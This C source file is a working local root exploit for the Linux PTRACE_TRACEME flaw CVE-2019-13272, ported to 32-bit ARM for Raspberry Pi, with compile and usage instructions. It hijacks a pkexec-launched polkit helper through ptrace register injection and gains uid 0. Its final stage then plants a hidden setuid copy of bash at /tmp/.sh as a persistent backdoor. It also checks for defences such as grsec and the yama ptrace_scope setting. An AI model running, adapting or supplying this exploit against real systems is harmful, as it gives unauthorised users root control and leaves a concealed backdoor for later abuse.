// Original exploit by Jann Horn (Project Zero)
// Cleaned up by bcoles <bcoles@gmail.com>
// ARM 32-bit port for Raspberry Pi 3B
//
// Compile on Pi:  gcc -Wall --std=gnu99 -s poc_arm.c -o poc_arm
// Usage:          ./poc_arm
//

#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <linux/elf.h>

// ARM 32-bit register layout for PTRACE_GETREGSET / PTRACE_SETREGSET
// uregs[0..15] = r0..r15, uregs[16] = cpsr, uregs[17] = ORIG_r0
struct arm_regs {
  unsigned long uregs[18];
};

#define ARM_r0    0
#define ARM_r1    1
#define ARM_r2    2
#define ARM_r3    3
#define ARM_r4    4
#define ARM_r5    5
#define ARM_r7    7
#define ARM_sp    13
#define ARM_lr    14
#define ARM_pc    15
#define ARM_cpsr  16

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

#define ENABLE_AUTO_TARGETING   1
#define ENABLE_FALLBACK_HELPERS 1

static const char *SHELL = "/bin/bash";

static int middle_success = 1;
static int block_pipe[2];
static int self_fd = -1;
static int dummy_status;
static const char *helper_path;
static const char *pkexec_path = "/usr/bin/pkexec";
static const char *pkaction_path = "/usr/bin/pkaction";
struct stat st;

const char *helpers[1024];

// execveat syscall number for ARM 32-bit
#ifndef __NR_execveat
#  define __NR_execveat 387
#endif

// ARM-specific ptrace request to change the active syscall number.
// On ARM, the kernel copies r7 into thread_info->syscallno BEFORE the
// ptrace stop, so modifying r7 via SETREGSET alone won't change which
// syscall actually executes. PTRACE_SET_SYSCALL updates the saved copy.
#ifndef PTRACE_SET_SYSCALL
#  define PTRACE_SET_SYSCALL 23
#endif

#if ENABLE_FALLBACK_HELPERS
const char *known_helpers[] = {
  // ARM/Raspbian paths
  "/usr/lib/arm-linux-gnueabihf/xfce4/session/xfsm-shutdown-helper",
  "/usr/lib/arm-linux-gnueabihf/cinnamon-settings-daemon/csd-backlight-helper",
  // Generic paths
  "/usr/lib/gnome-settings-daemon/gsd-backlight-helper",
  "/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper",
  "/usr/lib/unity-settings-daemon/usd-backlight-helper",
  "/usr/lib/unity-settings-daemon/usd-wacom-led-helper",
  "/usr/sbin/mate-power-backlight-helper",
  "/usr/sbin/xfce4-pm-helper",
  "/usr/bin/xfpm-power-backlight-helper",
  "/usr/bin/lxqt-backlight_backend",
  "/usr/libexec/gsd-wacom-led-helper",
  "/usr/libexec/gsd-wacom-oled-helper",
  "/usr/libexec/gsd-backlight-helper",
  "/usr/lib/gsd-backlight-helper",
  "/usr/lib/gsd-wacom-led-helper",
  "/usr/lib/gsd-wacom-oled-helper",
};
#endif

const char *blacklisted_helpers[] = {
  "/xf86-video-intel-backlight-helper",
  "/cpugovctl",
  "/resetxpad",
  "/package-system-locked",
  "/cddistupgrader",
};

#define SAFE(expr) ({                   \
  typeof(expr) __res = (expr);          \
  if (__res == -1) {                    \
    dprintf("[-] Error: %s\n", #expr);  \
    return 0;                           \
  }                                     \
  __res;                                \
})
#define max(a,b) ((a)>(b) ? (a) : (b))

static char *tprintf(char *fmt, ...) {
  static char buf[10000];
  va_list ap;
  va_start(ap, fmt);
  vsprintf(buf, fmt, ap);
  va_end(ap);
  return buf;
}

static int middle_main(void *dummy) {
  prctl(PR_SET_PDEATHSIG, SIGKILL);
  pid_t middle = getpid();

  self_fd = SAFE(open("/proc/self/exe", O_RDONLY));

  pid_t child = SAFE(fork());
  if (child == 0) {
    prctl(PR_SET_PDEATHSIG, SIGKILL);

    SAFE(dup2(self_fd, 42));

    int proc_fd = SAFE(open(tprintf("/proc/%d/status", middle), O_RDONLY));
    char *needle = tprintf("\nUid:\t%d\t0\t", getuid());
    while (1) {
      char buf[1000];
      ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0));
      buf[buflen] = '\0';
      if (strstr(buf, needle)) break;
    }

    SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL));

    execl(pkexec_path, basename(pkexec_path), NULL);

    dprintf("[-] execl: Executing suid executable failed");
    exit(EXIT_FAILURE);
  }

  SAFE(dup2(self_fd, 0));
  SAFE(dup2(block_pipe[1], 1));

  struct passwd *pw = getpwuid(getuid());
  if (pw == NULL) {
    dprintf("[-] getpwuid: Failed to retrieve username");
    exit(EXIT_FAILURE);
  }

  middle_success = 1;
  execl(pkexec_path, basename(pkexec_path), "--user", pw->pw_name,
        helper_path,
        "--help", NULL);
  middle_success = 0;
  dprintf("[-] execl: Executing pkexec failed");
  exit(EXIT_FAILURE);
}

/*
 * ARM 32-bit version of force_exec_and_wait
 *
 * ARM syscall convention:
 *   r7  = syscall number
 *   r0  = arg1
 *   r1  = arg2
 *   r2  = arg3
 *   r3  = arg4
 *   r4  = arg5
 *   r5  = arg6
 *
 * execveat(int dirfd, const char *pathname,
 *          char *const argv[], char *const envp[],
 *          int flags)
 */
static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) {
  struct arm_regs regs;
  struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };

  SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));
  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov));

  // scratch area below SP, page-aligned
  unsigned long scratch_area = (regs.uregs[ARM_sp] - 0x1000) & ~0xfffUL;

  // 32-bit ARM: unsigned long = 4 bytes, pointers = 4 bytes
  struct injected_page {
    unsigned long argv[2];   // {ptr to arg0, NULL}
    unsigned long envv[1];   // {NULL}
    char arg0[8];            // "stage2\0" or "stage3\0"
    char path[4];            // "\0" padded to word boundary
  } ipage;

  memset(&ipage, 0, sizeof(ipage));
  ipage.argv[0] = scratch_area + offsetof(struct injected_page, arg0);
  ipage.argv[1] = 0;
  ipage.envv[0] = 0;
  strcpy(ipage.arg0, arg0);

  unsigned int i;
  for (i = 0; i < sizeof(ipage) / sizeof(long); i++) {
    unsigned long pdata = ((unsigned long *)&ipage)[i];
    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
                (void*)pdata));
  }

  // Set ARM registers for execveat syscall
  regs.uregs[ARM_r7] = __NR_execveat;            // syscall number in r7
  regs.uregs[ARM_r0] = exec_fd;                  // dirfd
  regs.uregs[ARM_r1] = scratch_area + offsetof(struct injected_page, path);  // pathname
  regs.uregs[ARM_r2] = scratch_area + offsetof(struct injected_page, argv);  // argv
  regs.uregs[ARM_r3] = scratch_area + offsetof(struct injected_page, envv);  // envp
  regs.uregs[ARM_r4] = AT_EMPTY_PATH;            // flags

  // Use ARM-specific PTRACE_SET_SYSCALL to change the active syscall number
  // This is necessary because modifying r7 alone does NOT update the kernel's
  // saved syscallno in thread_info on ARM.
  SAFE(ptrace(PTRACE_SET_SYSCALL, pid, NULL, (void*)(unsigned long)__NR_execveat));
  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
  SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL));
  SAFE(waitpid(pid, &dummy_status, 0));

  return 0;
}

static int middle_stage2(void) {
  pid_t child = SAFE(waitpid(-1, &dummy_status, 0));
  return force_exec_and_wait(child, 42, "stage3");
}

// * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * *

static int spawn_shell(void) {
  SAFE(setresgid(0, 0, 0));
  SAFE(setresuid(0, 0, 0));
  execlp("/bin/sh", "sh", "-c", "cp /bin/bash /tmp/.sh && chmod u+s /tmp/.sh", NULL);
  dprintf("[-] execlp: Executing shell %s failed", SHELL);
  exit(EXIT_FAILURE);
}

// * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * *

static int check_env(void) {
  int warn = 0;
  const char* xdg_session = getenv("XDG_SESSION_ID");

  dprintf("[.] Checking environment ...\n");

  if (stat(pkexec_path, &st) != 0) {
    dprintf("[-] Could not find pkexec executable at %s\n", pkexec_path);
    exit(EXIT_FAILURE);
  }

  if (stat("/dev/grsec", &st) == 0) {
    dprintf("[!] Warning: grsec is in use\n");
    warn++;
  }

  if (xdg_session == NULL) {
    dprintf("[!] Warning: $XDG_SESSION_ID is not set\n");
    warn++;
  }

  if (system("/bin/loginctl --no-ask-password show-session \"$XDG_SESSION_ID\" | /bin/grep Remote=no >>/dev/null 2>>/dev/null") != 0) {
    dprintf("[!] Warning: Could not find active PolKit agent\n");
    warn++;
  }

  if (system("/sbin/sysctl kernel.yama.ptrace_scope 2>&1 | /bin/grep -q [23]") == 0) {
    dprintf("[!] Warning: kernel.yama.ptrace_scope >= 2\n");
    warn++;
  }

  if (warn > 0) {
    dprintf("[~] Done, with %d warnings\n", warn);
  } else {
    dprintf("[~] Done, looks good\n");
  }

  return warn;
}

#if ENABLE_AUTO_TARGETING
int find_helpers() {
  if (stat(pkaction_path, &st) != 0) {
    dprintf("[-] No helpers found. Could not find pkaction executable at %s.\n", pkaction_path);
    return 0;
  }

  char cmd[1024];
  snprintf(cmd, sizeof(cmd), "%s --verbose", pkaction_path);
  FILE *fp;
  fp = popen(cmd, "r");
  if (fp == NULL) {
    dprintf("[-] Failed to run %s: %m\n", cmd);
    return 0;
  }

  char line[1024];
  char buffer[2048];
  int helper_index = 0;
  int useful_action = 0;
  int blacklisted_helper = 0;
  static const char *needle = "org.freedesktop.policykit.exec.path -> ";
  int needle_length = strlen(needle);

  while (fgets(line, sizeof(line)-1, fp) != NULL) {
    if (strstr(line, "implicit active:")) {
      if (strstr(line, "yes")) {
        useful_action = 1;
      }
      continue;
    }

    if (useful_action == 0)
      continue;

    useful_action = 0;

    int length = strlen(line);
    char* found = memmem(&line[0], length, needle, needle_length);
    if (found == NULL)
      continue;

    memset(buffer, 0, sizeof(buffer));
    int i;
    for (i = 0; found[needle_length + i] != '\n'; i++) {
      if (i >= (int)sizeof(buffer)-1)
        continue;
      buffer[i] = found[needle_length + i];
    }

    blacklisted_helper = 0;
    for (i=0; i<(int)(sizeof(blacklisted_helpers)/sizeof(blacklisted_helpers[0])); i++) {
      if (strstr(&buffer[0], blacklisted_helpers[i]) != 0) {
        dprintf("[.] Ignoring helper (blacklisted): %s\n", &buffer[0]);
        blacklisted_helper = 1;
        break;
      }
    }
    if (blacklisted_helper == 1)
      continue;

    if (stat(&buffer[0], &st) != 0) {
      dprintf("[.] Ignoring helper (does not exist): %s\n", &buffer[0]);
      continue;
    }

    helpers[helper_index] = strndup(&buffer[0], strlen(buffer));
    helper_index++;

    if (helper_index >= (int)(sizeof(helpers)/sizeof(helpers[0])))
      break;
  }

  pclose(fp);
  return 0;
}
#endif

// * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * *

int ptrace_traceme_root() {
  dprintf("[.] Trying helper: %s\n", helper_path);

  SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));
  SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000));
  char dummy = 0;
  SAFE(write(block_pipe[1], &dummy, 1));

  dprintf("[.] Spawning suid process (%s) ...\n", pkexec_path);
  static char middle_stack[1024*1024];
  pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack),
                            CLONE_VM|CLONE_VFORK|SIGCHLD, NULL));
  if (!middle_success) return 1;

  while (1) {
    int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
    char buf[16];
    int buflen = SAFE(read(fd, buf, sizeof(buf)-1));
    close(fd);  // fix: prevent fd exhaustion on slow ARM CPUs
    buf[buflen] = '\0';
    *strchrnul(buf, '\n') = '\0';
    if (strncmp(buf, basename(helper_path), 15) == 0)
      break;
    usleep(5000);  // 5ms - tighter poll for slower Pi timing
  }

  dprintf("[.] Tracing midpid ...\n");
  SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL));
  SAFE(waitpid(midpid, &dummy_status, 0));
  dprintf("[~] Attached to midpid\n");

  force_exec_and_wait(midpid, 0, "stage2");
  exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
  if (strcmp(argv[0], "stage2") == 0)
    return middle_stage2();
  if (strcmp(argv[0], "stage3") == 0)
    return spawn_shell();

  dprintf("Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\n");
  dprintf("[*] ARM 32-bit port for Raspberry Pi\n");

  check_env();

  if (argc > 1 && strcmp(argv[1], "check") == 0) {
    exit(0);
  }

  int i;

#if ENABLE_AUTO_TARGETING
  dprintf("[.] Searching policies for useful helpers ...\n");
  find_helpers();
  for (i=0; i<(int)(sizeof(helpers)/sizeof(helpers[0])); i++) {
    if (helpers[i] == NULL)
      break;

    if (stat(helpers[i], &st) != 0)
      continue;

    helper_path = helpers[i];
    ptrace_traceme_root();
  }
#endif

#if ENABLE_FALLBACK_HELPERS
  dprintf("[.] Searching for known helpers ...\n");
  for (i=0; i<(int)(sizeof(known_helpers)/sizeof(known_helpers[0])); i++) {
    if (stat(known_helpers[i], &st) != 0)
      continue;

    helper_path = known_helpers[i];
    dprintf("[~] Found known helper: %s\n", helper_path);
    ptrace_traceme_root();
  }
#endif

  dprintf("[~] Done\n");

  return 0;
}